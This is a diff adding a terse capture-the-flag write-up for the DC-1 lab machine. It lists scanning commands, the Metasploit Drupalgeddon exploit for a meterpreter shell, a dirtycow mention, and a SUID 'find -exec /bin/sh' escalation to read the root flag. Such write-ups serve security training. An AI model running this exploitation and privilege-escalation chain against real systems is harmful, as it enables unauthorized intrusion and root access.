@@ -1,0 +1,20 @@
+DC-1 Writeup
+nmap -sV -A --script vuln 192.168.122.184
+nikto -h http://192.168.122.184
+
+Metasploit
+search drupal
+exploit/multi/http/drupal_drupageddon
+SET RHOST and lhost
+exploit
+get access of meterpreter payload
+
+Get sysinfo
+Try to Privilage Escalation using dirtycow
+
+find / -perm -4000 2>/dev/null
+find . -exec /bin/sh \; -quit
+cat /root/thefinalflag.txt
+
+
+
